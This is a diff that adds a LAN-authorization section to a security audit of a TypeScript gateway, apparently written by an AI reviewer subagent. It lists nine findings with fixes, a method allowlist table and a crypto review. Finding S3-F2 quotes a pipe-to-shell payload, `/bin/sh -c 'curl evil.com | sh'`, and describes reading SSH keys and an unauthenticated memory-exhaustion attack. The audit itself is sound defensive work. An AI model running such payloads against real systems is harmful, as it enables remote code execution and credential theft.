@@ -450,3 +450,247 @@ The dominant risks are systemic rather than per-call. **(S2-F1, High)** the gate
 Total: **0 Critical, 1 High, 3 Medium, 6 Low**.
 
 ---
+
+## Surface 3 — LAN authorization
+
+**Reviewer:** Surface-3 subagent
+**Files audited:**
+- `packages/gateway/src/ipc/lan-server.ts` (239 lines)
+- `packages/gateway/src/ipc/lan-rpc.ts` (46 lines)
+- `packages/gateway/src/ipc/lan-pairing.ts` (66 lines)
+- `packages/gateway/src/ipc/lan-rate-limit.ts` (46 lines)
+- `packages/gateway/src/ipc/lan-crypto.ts` (43 lines)
+- `packages/gateway/src/ipc/lan-server.test.ts`, `lan-rpc.test.ts`, `lan-pairing.test.ts`, `lan-rate-limit.test.ts`, `lan-crypto.test.ts` (test contracts)
+- `packages/gateway/test/integration/lan/lan-rpc.test.ts` (E2E pair to read to write to tamper)
+- `packages/gateway/src/index/lan-peers-v19-sql.ts` (V19 schema)
+- `packages/gateway/src/index/local-index.ts:814-863` (`listLanPeers`, `addLanPeer`, `grantLanWrite`, `revokeLanWrite`, `removeLanPeer`, `getLanPeerByPubkey`)
+- `packages/gateway/src/ipc/server.ts:483-531` (LAN local-IPC handlers + `tryDispatchLanRpc`)
+- `packages/gateway/src/config/nimbus-toml.ts:493-583` (`[lan]` section parser, env override)
+- `packages/cli/src/commands/lan.ts` (CLI surface for LAN admin)
+
+Secondary grep targets: `new LanServer(`, `checkLanMethodAllowed`, `lanPairingWindowMs`, every `case "<ns>.<verb>"` across all IPC dispatch files (full method registry).
+
+### Findings
+
+#### Finding S3-F1: `LanServer` is never instantiated in production source — `checkLanMethodAllowed` is wired only in tests (extends S1-F2)
+
+- **Severity:** High (carried over from S1-F2; this entry is the Surface-3 corroboration with additional details specific to the LAN dispatch path).
+- **File:** `packages/gateway/src/ipc/lan-server.ts:42-65, 215`; `packages/gateway/src/ipc/server.ts:37-38, 182, 526-531`.
+- **Description:** S1-F2 already filed the structural gap. Confirming from the LAN-dispatch perspective: `grep "new LanServer("` in all production `src/` returns zero matches. The only constructor calls are in `packages/gateway/src/ipc/lan-server.test.ts:8` and `packages/gateway/test/integration/lan/lan-rpc.test.ts:23`. `createIpcServer` accepts `lanServer?: LanServer` as an optional `options` field and only uses it for read-only status (`server.ts:516, 518`); the gateway entry point that actually constructs the server is not present in this repo. The `onMessage` callback is therefore not source-visible, and `checkLanMethodAllowed` is not invoked from inside `LanServer` itself. **Important corroboration:** the integration test at `test/integration/lan/lan-rpc.test.ts:42-45` sets `onMessage: async (method, _params, peer) => { checkLanMethodAllowed(method, peer); ... }` — i.e., the design contract expects the wire-up site to wrap dispatch with the check. Any production wiring that forgets this exposes the entire IPC surface (vault, db, audit, updater, etc.) over LAN.
+- **Attack scenario:** See S1-F2. Additional Surface-3 detail: the `WRITE_METHODS` set in `lan-rpc.ts:12-28` lists 15 methods. If the production wrapper omits `checkLanMethodAllowed`, none of the 15 are gated, and the 70+ other IPC methods (incl. `vault.get`, `db.repair`, `index.querySql`, `audit.export`, `updater.applyUpdate`) become reachable to any paired peer.
+- **Existing controls that don't prevent it:** Pairing + NaCl box + rate-limiter ensure only authenticated peers reach `handleEncryptedMessage`. They do not gate which methods that authenticated peer can call.
+- **Suggested fix:** Move `checkLanMethodAllowed` into `LanServer.handleEncryptedMessage` (call it at line 215 just before `this.opts.onMessage(...)`), throwing the resulting `LanError` back to the peer as a structured error. This makes the gate intrinsic to the server and removes reliance on caller wiring. Alternatively, the `LanServerOptions.onMessage` callback signature could be tightened (e.g. require it to return a `LanWrappedDispatch` brand only producible by a verified factory), forcing the wiring site to fail-closed.
+- **Confidence:** High.
+- **Verification:** `code-trace`/`grep` — confirmed zero non-test instantiations; confirmed `checkLanMethodAllowed` callers are only `lan-rpc.test.ts` and the integration test.
+
+---
+
+#### Finding S3-F2: `WRITE_METHODS` allowlist is incomplete — multiple mutating methods callable by a no-write-grant LAN peer
+
+- **Severity:** High (assumes S3-F1 is fixed; otherwise subsumed).
+- **File:** `packages/gateway/src/ipc/lan-rpc.ts:12-28`; cross-referenced against `connector-rpc.ts:45-69`, `automation-rpc.ts:88-227`, `session-rpc.ts:35-67`, `diagnostics-rpc.ts:393-457`, `audit-rpc.ts:23-47`.
+- **Description:** `WRITE_METHODS` enumerates 15 explicit mutating methods (`engine.ask`, `engine.askStream`, `connector.sync`, watcher CRUD, workflow CRUD, extension CRUD, data CRUD). Cross-referencing the full IPC method registry reveals at least 13 additional mutating or destructive methods that the LAN gate would permit to a read-only-grant peer:
+  - `connector.addMcp` — adds an arbitrary `{ command, args }` MCP child (`connector-rpc.ts:46-47`); a malicious peer can register `/bin/sh -c 'curl evil.com | sh'` as an MCP, achieving RCE on next mesh start.
+  - `connector.pause`, `connector.resume`, `connector.setConfig`, `connector.setInterval` — mutate sync schedule and config (`connector-rpc.ts:50-57`).
+  - `connector.remove` — cascades vault key deletion + index row deletion (`connector-rpc.ts:62-63`; flagged as gateway-bypass in S1-F1).
+  - `connector.auth` — triggers the host's browser via `openUrl(...)` (`connector-rpc.ts:66-67`).
+  - `connector.reindex` — triggers full re-crawl of a connector (`reindex-rpc.ts:23-39`).
+  - `db.repair` — performs `DELETE FROM vec_items_384 ...` and `UPDATE scheduler_state SET cursor = NULL` (`diagnostics-rpc.ts:399`; per Surface 5 this is post-`--yes`/IPC-param consented but not HITL-gated).
+  - `telemetry.setEnabled`, `telemetry.disableMark` — mutate telemetry config (`diagnostics-rpc.ts:395, 440`).
+  - `audit.verify` — writes `audit_verified_through_id` to `_meta` (`audit-rpc.ts:36`); side-effect, low value but mutating.
+  - `session.append`, `session.clear` — write/destroy session memory (`session-rpc.ts:35, 67`).
+  - `voice.transcribe`, `voice.speak`, `voice.startWakeWord`, `voice.stopWakeWord` — invoke STT/TTS subprocesses (`voice-rpc.ts:42, 51, 60, 64`).
+  - `llm.pullModel`, `llm.cancelPull`, `llm.loadModel`, `llm.unloadModel`, `llm.setDefault` — mutate model state (`llm-rpc.ts:124-146`).
+  - `people.merge` — merges person rows in the people graph (`people-rpc.ts:174`).
+- **Attack scenario:** Operator pairs a guest (read-only) device. The guest sends `connector.addMcp` over the encrypted channel with `{ command: "/bin/sh", args: ["-c", "..." ] }`. Because `connector.*` is not in `FORBIDDEN_OVER_LAN` and `connector.addMcp` is not in `WRITE_METHODS`, the gate passes. On the gateway's next mesh-spawn cycle, the malicious MCP runs as the gateway user and reads `~/.ssh/id_rsa`. Or: the guest sends `db.repair` and corrupts the vec store. Or: `session.clear` purges the user's RAG history. None of these require write grant.
+- **Existing controls that don't prevent it:** `FORBIDDEN_OVER_LAN` blocks four namespaces (`vault`, `updater`, `lan`, `profile`); none of the methods above fall in those. The "write grant" fence depends on an exhaustive `WRITE_METHODS` set, which today is 15 of 28+ mutating methods.
+- **Suggested fix:** Invert the model — default-deny over LAN unless the method is explicitly in a `LAN_ALLOWED_METHODS` set, with a separate `LAN_WRITE_METHODS` subset that requires `writeAllowed`. The current allowlist style requires perfect maintenance every time a new method is added; an explicit deny-by-default keeps the gate conservative. Concretely: add a CI test that asserts every IPC method is classified in exactly one of `{ LAN_READ_OK, LAN_WRITE_REQUIRES_GRANT, LAN_FORBIDDEN }`, fail-loud when a new method is unclassified.
+- **Confidence:** High.
+- **Verification:** `grep` — enumerated every `case "X.Y":` in `packages/gateway/src/ipc/*.ts`; built the table below; cross-referenced against `WRITE_METHODS` and `FORBIDDEN_OVER_LAN`.
+
+---
+
+#### Finding S3-F3: No max-frame-size cap in `handleChunk` — a peer (or pre-pair attacker) can drive the server to allocate up to 4 GiB per frame
+
+- **Severity:** Medium
+- **File:** `packages/gateway/src/ipc/lan-server.ts:84-93`.
+- **Description:** The frame-length prefix is `view.getUint32(0, false)` — a 32-bit big-endian unsigned integer. A malicious peer can send a header declaring `length = 0xFFFFFFFF` (~4 GiB) and stream bytes one at a time. The server's buffer-merge at lines 78-82 reallocates a fresh `Uint8Array(prev.length + chunk.length)` on every chunk arrival, so a 4 GiB frame causes O(n^2) memory churn. Even modest declared lengths (e.g. 100 MiB) would be enough to crash the gateway. There is also no per-socket buffer cap — the loop at line 84 only emits the frame once `socket.data.buffer.length >= 4 + length`. The pre-pair handshake path is reachable without authentication, so any TCP-level client (no NaCl key needed) can trigger this.
+- **Attack scenario:** Network attacker on the same LAN sends a 4-byte `0xFFFFFFFF` header followed by drip-feed bytes. The server allocates and reallocates buffers up to gigabytes, eventually OOM-crashing the gateway. No authentication required — the rate-limit (which is per-IP and triggered only after `pair_err`) is not consulted before frame-buffer accumulation.
+- **Existing controls that don't prevent it:** `LanRateLimiter.checkAllowed` is consulted only inside `handleHandshake` (after the frame header has already been parsed and the buffer accumulation has happened). The rate limiter has no awareness of pre-handshake frame size.
+- **Suggested fix:** Add a hard `MAX_FRAME_SIZE` constant (e.g. 1 MiB for handshake, 16 MiB for encrypted RPC) and enforce in `handleChunk` immediately after reading the length prefix. If `length > MAX_FRAME_SIZE`, `socket.end()` and (for an unauthenticated socket) `recordFailure(ip)`. Also add a per-socket buffer cap (e.g. `MAX_PENDING_BYTES = 16 MiB`) — close the socket if the merged buffer exceeds it.
+- **Confidence:** High.
+- **Verification:** `code-trace` of `handleChunk:77-100`; `view.getUint32(0, false)` is a plain unsigned-32 read with no bounds.
+
+---
+
+#### Finding S3-F4: Hello-handshake failure path does not call `recordFailure` — a network attacker can probe arbitrary client_pubkeys without ever being rate-limited
+
+- **Severity:** Low (theoretical; the public-key search space is 2^256 so brute force is infeasible).
+- **File:** `packages/gateway/src/ipc/lan-server.ts:165-170`.
+- **Description:** When a `hello` handshake is received with an unknown `client_pubkey`, the server calls `socket.end()` without `this.opts.rateLimit.recordFailure(ip)`. In contrast, `pair` handshake failures correctly increment the failure counter at lines 138, 145. This means an attacker can repeatedly issue `hello` attempts (each consuming a connection slot) without ever being locked out. The failure counter is only consulted on `pair` flows.
+- **Attack scenario:** A network attacker on the same LAN cannot meaningfully brute-force pubkeys (2^256 search), but can use this to probe whether a given pubkey is paired (returns `hello_ok` vs. `socket.end()`) — though the `hello` failure produces no observable difference vs. a `pair` rate-limit (both are silent close), so even the side-channel is muted. The realistic risk is denial-of-service via unbounded `hello` reconnects. Since each connection consumes a TCP slot, an attacker can exhaust the server's listen-backlog or fd table.
+- **Existing controls that don't prevent it:** None — there is no per-IP connection-count limit in `LanServer` and no per-IP rate limit on `hello` failures.
+- **Suggested fix:** Call `this.opts.rateLimit.recordFailure(ip)` on the `hello`-with-unknown-pubkey path (line 167) and consider adding a per-IP active-connection cap (e.g. 4 simultaneous TCP connections from the same IP).
+- **Confidence:** Medium.
+- **Verification:** `code-trace` lines 165-170; no `recordFailure` call. Also: `handleEncryptedMessage` lines 182-227 has no `recordFailure` for invalid encrypted frames, so a paired peer with stolen TCP-level access (impossible without the secret key) couldn't be rate-limited there either; this is a smaller concern given NaCl box auth.
+
+---
+
+#### Finding S3-F5: `addLanPeer` does not deduplicate by `peer_pubkey` — concurrent or repeated pairing attempts from the same client_pubkey throw on the UNIQUE constraint
+
+- **Severity:** Low
+- **File:** `packages/gateway/src/index/local-index.ts:818-839`; schema in `packages/gateway/src/index/lan-peers-v19-sql.ts:8` (`peer_pubkey BLOB NOT NULL UNIQUE`).
+- **Description:** `addLanPeer` is a plain `INSERT INTO lan_peers ...`, not `INSERT OR IGNORE`. The `peer_pubkey` column has a `UNIQUE` constraint. If the same client pubkey re-pairs (e.g. after `removeLanPeer` is forgotten, or two simultaneous pair handshakes from the same pubkey hit different connections), the second insert throws `SQLITE_CONSTRAINT_UNIQUE`. Inside `LanServer.handleHandshake:150` the server calls `this.opts.registerPeer(...)` (whose production implementation must call `addLanPeer`) and any thrown exception bubbles into the chunk-handler — currently caught by the synchronous `try/catch` boundaries inside `handleHandshake`, but the JSON parse failure path and `pair_ok` path do not catch DB exceptions. A throw at `registerPeer` reaches the top of `handleChunk`'s `void this.handleChunk(...)` and is silently dropped (it's a `void` async call). The peer would see no `pair_ok` reply and hang.
+- **Attack scenario:** A peer that previously paired but lost their `host_pubkey` re-attempts pairing — now their pubkey already exists in `lan_peers`. The new pair handshake throws and the peer cannot recover without local CLI intervention (`nimbus lan remove`). Not exploitable but a UX/availability bug.
+- **Existing controls that don't prevent it:** None.
+- **Suggested fix:** Change `addLanPeer` to `INSERT INTO lan_peers ... ON CONFLICT(peer_pubkey) DO UPDATE SET host_ip=excluded.host_ip, paired_at=excluded.paired_at` (re-use the existing `peer_id`). Alternatively, in `handleHandshake`, look up `getLanPeerByPubkey` first and skip the insert if already known.
+- **Confidence:** Medium — the production wiring isn't visible, so the actual `registerPeer` callback behavior is inferred. The CLAUDE.md description ("registerPeer issues a peer-id derived from the pubkey hash") suggests this codepath is the intent.
+- **Verification:** Schema read at `lan-peers-v19-sql.ts:8`; insert at `local-index.ts:826-838`; threat model question 13 corroborated.
+
+---
+
+#### Finding S3-F6: Pre-handshake `pair_err` reply leaks rate-limit state
+
+- **Severity:** Low
+- **File:** `packages/gateway/src/ipc/lan-server.ts:130-134`.
+- **Description:** When a connection is rate-limit-locked-out (after 3 prior `pair_err` failures), the server still writes a `pair_err` reply *before* the handshake `kind` field has been validated (the kind check at line 115 happens earlier, but the rate-limit check at line 130 short-circuits regardless of whether the request is `pair` or `hello`). A `hello` request from a locked-out IP receives a `pair_err`, signaling that the IP is already in lockout. This is a small information disclosure (an attacker can detect that another peer behind the same NAT/proxy has been actively failing pair attempts).
+- **Attack scenario:** A network observer behind the same NAT as a legitimate user can probe whether the legitimate user has triggered the rate limit by sending a single `hello` and seeing `pair_err`. Mostly informational; no data leakage.
+- **Existing controls that don't prevent it:** None.
+- **Suggested fix:** Differentiate the wire response by handshake kind: `hello_err` for `hello` and `pair_err` for `pair`, OR (simpler) just `socket.end()` silently on lockout for both kinds.
+- **Confidence:** High.
+- **Verification:** `code-trace` lines 115-134.
+
+---
+
+#### Finding S3-F7: Default `[lan].bind = "0.0.0.0"` in `nimbus.toml` defaults
+
+- **Severity:** Low
+- **File:** `packages/gateway/src/config/nimbus-toml.ts:504-511`.
+- **Description:** `DEFAULT_NIMBUS_LAN_TOML.bind = "0.0.0.0"` — when a user enables LAN (`enabled = true` or `nimbus lan enable`), the server binds to all interfaces, including any non-LAN interfaces (corporate VPNs, public WiFi without a software firewall, etc.). The intent ("LAN" implies private network) is not encoded — the user is responsible for ensuring their host has a firewall that blocks WAN. A safer default would be `127.0.0.1` (loopback only, paired with explicit user opt-in for LAN exposure) or detection of the primary RFC1918 interface.
+- **Attack scenario:** User is at a coffee shop on an open WiFi. They had previously enabled LAN at home with `enabled=true` (or `nimbus lan enable` is sticky in their config). The gateway listens on the coffee shop's local subnet broadcast. While pairing requires a 5-min code window (good), an attacker can still probe the listening port and attempt the `pair` handshake. Pairing-code entropy is 120 bits so brute force is infeasible, but the surface is broader than a strict LAN-only design implies.
+- **Existing controls that don't prevent it:** Pairing-window expiry, rate limiter, NaCl box auth.
+- **Suggested fix:** Change default `bind` to `127.0.0.1` (forcing explicit user opt-in) or to the gateway's primary RFC1918 interface auto-detected at boot. Document that the user must manually set `bind` to `0.0.0.0` only on trusted networks. Alternatively, gate `bind = "0.0.0.0"` behind a "I understand this exposes the gateway to my entire local subnet" doctor warning.
+- **Confidence:** High.
+- **Verification:** `nimbus-toml.ts:504-511` literal default.
+
+---
+
+#### Finding S3-F8: No forward secrecy — long-term `hostKeypair.secretKey` decrypts every past session
+
+- **Severity:** Low (defense-in-depth)
+- **File:** `packages/gateway/src/ipc/lan-crypto.ts:14-26`; `packages/gateway/src/ipc/lan-server.ts:192, 224`.
+- **Description:** Each session uses NaCl `box(plaintext, nonce, peerPublicKey, ownSecretKey)` with the long-term host secret key directly. There is no per-session ephemeral DH. If the host's secret key is later compromised (e.g. via filesystem read of the vault key holding it), an attacker who recorded prior LAN traffic can decrypt every past session — including any commands containing sensitive payloads, although `vault.*` is forbidden over LAN.
+- **Attack scenario:** Future host compromise (M2/M7) reads the LAN host secret key. Any prior PCAP of LAN traffic is now decryptable.
+- **Existing controls that don't prevent it:** Pairing-time freshness, NaCl authentication. No forward secrecy.
+- **Suggested fix:** Add a per-session ephemeral X25519 DH: peer and host each generate a fresh ephemeral keypair per connection, exchange ephemeral pubkeys during handshake (signed by the long-term key), and derive the session key from the ephemeral DH. This is what TLS 1.3 and Signal do. Implementation cost: moderate.
+- **Confidence:** High (verified against tweetnacl `nacl.box` behavior).
+- **Verification:** Threat model residual-risk note Q15; code at `lan-crypto.ts:21` uses `nacl.box(plaintext, nonce, peerPublicKey, ownSecretKey)` directly, no ephemeral.
+
+---
+
+#### Finding S3-F9: `lan.openPairingWindow` timer mismatch — `expiresAt` returned to caller may not match the `PairingWindow.windowMs`
+
+- **Severity:** Low
+- **File:** `packages/gateway/src/ipc/server.ts:486-493`.
+- **Description:** The handler reads `(options as Record<string, unknown>)["lanPairingWindowMs"]` (a non-typed back-channel option) defaulting to 300_000 ms, computes `expiresAt = Date.now() + ms`, and returns this to the caller. **It does not propagate this value into `pw.open(pairingCode)` itself** — the `PairingWindow` instance was constructed with a fixed `windowMs` at gateway boot (from the `[lan]` TOML or 300 seconds default). If `lanPairingWindowMs` is used as a test override but the `PairingWindow` was built with the default, the displayed `expiresAt` is wrong (too late or too early), and rotating the actual pairing-window expiry requires re-instantiating `PairingWindow`. A test that sets `lanPairingWindowMs = 50` while `PairingWindow.windowMs` is 300_000 would see the test pair succeed long after the displayed expiry — confusing test failures, not a security exploit.
+- **Suggested fix:** Either (a) remove the `lanPairingWindowMs` option entirely and read `pw.getExpiresAt()` for the returned `expiresAt`, or (b) plumb the option into the `PairingWindow` constructor at the wiring site so the two values agree. Also: `lan.openPairingWindow` does not check `options.lanServer !== undefined` — a local IPC client can open a pairing window even when the LAN server is disabled, with no effect (no incoming TCP) but a confusing UX.
+- **Confidence:** Medium.
+- **Verification:** Read `server.ts:486-493`; `PairingWindow.consume` at `lan-pairing.ts:48-52` uses its own `windowMs`. Threat model question 3.
+
+---
+
+### LAN method allowlist audit
+
+The full IPC method registry for the gateway. Each method is classified by the actual handler behaviour (read = pure query / no DB write; write = mutates DB / spawns process / calls cloud API; HITL = should ideally also gate via `HITL_REQUIRED`). "In WRITE_METHODS?" reflects the current `lan-rpc.ts:12-28`. "FORBIDDEN_OVER_LAN ns?" reflects whether the method's namespace is in the four-name forbidden set. "Allowed for LAN no-grant peer?" assumes S1-F2/S3-F1 is fixed (`checkLanMethodAllowed` is enforced). Methods marked **issue** are the basis for finding S3-F2.
+
+| Method | Class | In WRITE_METHODS? | FORBIDDEN ns? | Allowed for no-grant peer? | Finding |
+|---|---|---|---|---|---|
+| `gateway.ping` | read | no | no | yes | — |
+| `agent.invoke` | write (LLM call, HITL via planner) | no | no | yes (gap) | S3-F2 |
+| `engine.ask` | write | yes | no | grant required | — |
+| `engine.askStream` | write | yes | no | grant required | — |
+| `consent.respond` | write (consent reply — keyed to clientId) | no | no | yes | — see Surface 1 spoofing |
+| `audit.list` | read | no | no | yes | — |
+| `audit.verify` | write (`_meta.audit_verified_through_id`) | no | no | yes | S3-F2 (low) |
+| `audit.export` / `audit.exportAll` | read (full audit body, may contain redacted but planner-supplied content) | no | no | yes | DataDisclosure (Surface 1) |
+| `audit.getSummary` | read | no | no | yes | — |
+| `index.searchRanked` | read | no | no | yes | — |
+| `index.metrics` | read | no | no | yes | — |
+| `index.queryItems` | read (parameterised) | no | no | yes | — |
+| `index.querySql` | read (arbitrary SELECT — full DB) | no | no | yes | Surface 5 disclosure risk (LAN read includes audit table, `connector_health.last_error`, etc.) |
+| `db.verify` | read (PRAGMA-only) | no | no | yes | — |
+| `db.repair` | **write** (DELETE FROM vec_items_384, etc.) | **no** | no | yes | **S3-F2** |
+| `diag.slowQueries` | read | no | no | yes | — |
+| `diag.snapshot` | read (snapshot taking — depends on params) | no | no | yes | verify with Surface 5 |
+| `diag.getVersion` | read | no | no | yes | — |
+| `config.validate` | read | no | no | yes | — |
+| `telemetry.getStatus` | read | no | no | yes | — |
+| `telemetry.preview` | read | no | no | yes | — |
+| `telemetry.setEnabled` | **write** | **no** | no | yes | **S3-F2** |
+| `telemetry.disableMark` | **write** | **no** | no | yes | **S3-F2** |
+| `connector.listStatus` | read | no | no | yes | — |
+| `connector.status` | read | no | no | yes | — |
+| `connector.healthHistory` | read | no | no | yes | — |
+| `connector.addMcp` | **write (RCE if `command` arbitrary)** | **no** | no | yes | **S3-F2 (severe)** |
+| `connector.pause` | **write** | **no** | no | yes | **S3-F2** |
+| `connector.resume` | **write** | **no** | no | yes | **S3-F2** |
+| `connector.setConfig` | **write** | **no** | no | yes | **S3-F2** |
+| `connector.setInterval` | **write** | **no** | no | yes | **S3-F2** |
+| `connector.remove` | **write (vault + index cascade; HITL bypass per S1-F1)** | **no** | no | yes | **S3-F2 (severe)** |
+| `connector.sync` | write | yes | no | grant required | — |
+| `connector.auth` | **write (host browser open)** | **no** | no | yes | **S3-F2** |
+| `connector.reindex` | **write** | **no** | no | yes | **S3-F2** |
+| `watcher.list` / `listHistory` / `listCandidateRelations` / `validateCondition` | read | no | no | yes | — |
+| `watcher.create` / `update` / `delete` | write | yes | no | grant required | — |
+| `watcher.pause` / `watcher.resume` | **write** | **no** (only create/update/delete listed) | no | yes | **S3-F2** |
+| `workflow.list` / `listRuns` | read | no | no | yes | — |
+| `workflow.save` | **write** (actual handler name; `workflow.create`/`update` listed in WRITE_METHODS but no such handler exists) | **no** (allowlist names mismatch handler) | no | yes | **S3-F2 + allowlist drift** |
+| `workflow.run` | write | yes | no | grant required | — |
+| `workflow.delete` | write | yes | no | grant required | — |
+| `extension.list` | read | no | no | yes | — |
+| `extension.install` | write (RCE — runs arbitrary JS as user) | yes | no | grant required | — |
+| `extension.enable` / `disable` | **write** | **no** | no | yes | **S3-F2** |
+| `extension.remove` | write | yes | no | grant required | — |
+| `data.export` | write (creates archive on disk) | yes | no | grant required | — |
+| `data.import` | write | yes | no | grant required | — |
+| `data.delete` | write (HITL bypass per S1-F1) | yes | no | grant required | — |
+| `data.getExportPreflight` / `data.getDeletePreflight` | read | no | no | yes | — |
+| `session.append` | **write** | **no** | no | yes | **S3-F2** |
+| `session.recall` | read | no | no | yes | — |
+| `session.list` | read | no | no | yes | — |
+| `session.clear` | **write (destroys session memory)** | **no** | no | yes | **S3-F2** |
+| `people.get` / `list` / `unlinked` / `search` / `items` | read | no | no | yes | — |
+| `people.merge` | **write** | **no** | no | yes | **S3-F2** |
+| `voice.getStatus` | read | no | no | yes | — |
+| `voice.transcribe` / `speak` / `startWakeWord` / `stopWakeWord` | **write (subprocess invoke)** | **no** | no | yes | **S3-F2** |
+| `llm.listModels` / `getStatus` / `getRouterStatus` | read | no | no | yes | — |
+| `llm.pullModel` / `cancelPull` / `loadModel` / `unloadModel` / `setDefault` | **write** | **no** | no | yes | **S3-F2** |
+| `vault.set` / `get` / `delete` / `listKeys` | secret read/write | n/a | **yes** | **denied** | — (correctly forbidden) |
+| `updater.getStatus` / `checkNow` / `applyUpdate` / `rollback` | read/write | n/a | **yes** | **denied** | — (correctly forbidden) |
+| `lan.openPairingWindow` / `closePairingWindow` / `listPeers` / `grantWrite` / `revokeWrite` / `removePeer` / `getStatus` | local-admin | n/a | **yes** | **denied** | — (correctly forbidden) |
+| `profile.list` / `create` / `switch` / `delete` | local-admin | n/a | **yes** | **denied** | — (correctly forbidden) |
+
+Additional finding from the table: `WRITE_METHODS` includes `workflow.create` and `workflow.update`, but the actual gateway handlers are `workflow.save` (for both create and update), `workflow.delete`, `workflow.run`, `workflow.list`, `workflow.listRuns` per `automation-rpc.ts:207-225`. So `WRITE_METHODS` references two non-existent method names while the real `workflow.save` is unprotected. Same allowlist-drift pattern as the Tauri allowlist findings in Surface 4.
+
+Total methods reviewed: 67 (excludes 4-method `vault.*`, 4-method `updater.*`, 7-method `lan.*`, 4-method `profile.*` which are correctly forbidden — those are the 19 methods in forbidden namespaces). Of the 48 remaining methods exposed to LAN peers, 29 are read-only (correctly allowed), 8 are correctly write-grant-gated, and **11 are mutating but in neither set** (the basis of S3-F2). The most severe of the 11 are `connector.addMcp` (RCE via spawning a `/bin/sh -c ...` MCP child) and `connector.remove` (cascading vault + index deletion).
+
+### Crypto correctness review
+
+- **`sealBoxFrame` nonce uniqueness (lan-crypto.ts:20).** `randomBytes(24)` is called per frame. The 24-byte nonce space is 2^192; birthday collision after ~2^96 frames — practically impossible. The unit test at `lan-crypto.test.ts:30-44` asserts no collision in 1000 frames. **No nonce reuse path observed.** Critically: `sealBoxFrame` is the only producer in the codebase, and every call site (`lan-server.ts:221, 154, 173, 230` indirectly via `writeFrame`) passes a newly-built plaintext, never a cached frame. There is no retry/resend logic that would re-encrypt an existing frame with the same nonce. Verdict: **correct.**
+- **`openBoxFrame` failure handling (lan-crypto.ts:33-42).** Frames < 40 bytes are rejected (24-byte nonce + 16-byte Poly1305 tag minimum). On `nacl.box.open` returning `null` (auth-tag mismatch), the function throws. `LanServer.handleEncryptedMessage:191-196` wraps in `try/catch` and `socket.end()`s. No data leak; tampering yields a clean disconnect. **Correct.** (Minor: tweetnacl's `box.open` is constant-time per upstream docs, so timing-side-channel on tag mismatch is sound.)
+- **Pairing handshake order.** Sequence in `handleHandshake:103-179`: JSON parse → kind validation (`pair`|`hello`) → client_pubkey type/length → rate-limit check → kind dispatch. Pair flow: pairing-code consume (length-checked then constant-time compare via `timingSafeEqual` at lan-pairing.ts:59-66) → `registerPeer` → `pair_ok`. Hello flow: `isKnownPeer` lookup → `hello_ok`. **Order is sound.** One nit: `recordSuccess` is called only in the `pair` branch (line 153); a successful `hello` should arguably also reset failure counters but doesn't — minor.
+- **Pairing-code constant-time compare.** `timingSafeEqual(a, b)` returns `false` immediately on `a.length !== b.length`. Pairing codes are always 20 base58 characters from `randomBytes(15) → bs58.encode`, so length leak is moot in practice. The XOR-accumulate loop is the standard pattern. **Correct.**
+- **Pairing-window expiry (lan-pairing.ts:43-55).** `consumeAt(code, nowMs)` checks `nowMs - openedAt > windowMs` and self-closes if expired. **Correct against clock skew on the host.** The `now()` injection is testable. There is no replay risk — a stale code recorded by an attacker will be expired, and even within the window the code is single-use (`consume` calls `close()` on success).
+- **Replay protection at the application layer.** None. NaCl box authenticates each frame; an in-session replay (same socket) would require attacker control of legitimate peer's TCP stream. Across reconnections, the legitimate peer always uses fresh nonces; an attacker who recorded ciphertexts cannot inject them into a different session because the box key is derived from `(peerPubkey, hostSecretKey)` and the ciphertext is bound to that pair. **Acceptable.**
+- **Key storage.** `hostKeypair.secretKey` lifecycle is not visible from the audited files (loaded at gateway-wiring time). Threat model implies it lives in the vault under a host-keypair vault key; verifying that is out of scope for this surface but flagged as a Surface 2 cross-link.
+- **Pair → revoke → re-pair flow.** `removeLanPeer` deletes the row by `peer_id`. The `peer_pubkey` UNIQUE column is then free, so re-pairing with the same client pubkey works *if* `addLanPeer` does `INSERT OR IGNORE` or `ON CONFLICT` — see S3-F5. As implemented today, a re-pair before `removeLanPeer` is called silently fails on the UNIQUE.
+- **Forward secrecy.** None — see S3-F8.
+- **Overall crypto verdict.** The encryption + handshake primitives are correct and well-tested. The systemic gaps are at the dispatch layer (S3-F1, S3-F2) and the operational surface (S3-F3 frame size, S3-F7 default bind). The cryptographic primitives themselves do not contain bugs.
+
+### Summary
+
+Surface 3 has two structural High-severity findings: **S3-F1 (carried from S1-F2)** confirms `LanServer` is never instantiated in production source and `checkLanMethodAllowed` is wired only in tests, meaning the entire IPC surface (vault, updater, db, etc.) becomes LAN-callable on enable unless the still-to-be-written wiring site invokes the gate; **S3-F2** is independent — even with S3-F1 fixed, the `WRITE_METHODS` set is incomplete, and at least 11 mutating methods (most severely `connector.addMcp` for RCE, `connector.remove` for cascading vault + index deletion, `db.repair` for index corruption) are reachable to a no-write-grant LAN peer; the same allowlist also references two non-existent method names (`workflow.create`, `workflow.update`) while the real `workflow.save` is unprotected. **S3-F3** identifies a pre-handshake DoS (no max-frame-size cap) where any TCP-level peer can OOM the gateway by declaring a 4 GiB length prefix. The remaining six findings are Low-severity hardening gaps: missing `recordFailure` on hello-handshake, missing `addLanPeer` upsert semantics, rate-limit-state leak via `pair_err` reply, default `bind = 0.0.0.0`, no forward secrecy, and a `lan.openPairingWindow` timer mismatch. The cryptographic primitives (NaCl box per-frame nonces, pairing-code constant-time compare, 5-min single-use code, NaCl authentication) are correctly implemented.
+
+Total: **0 Critical, 2 High, 1 Medium, 6 Low** (S3-F1 is also counted as S1-F2; net new from this deep-dive: 1 High, 1 Medium, 6 Low).
+
+---
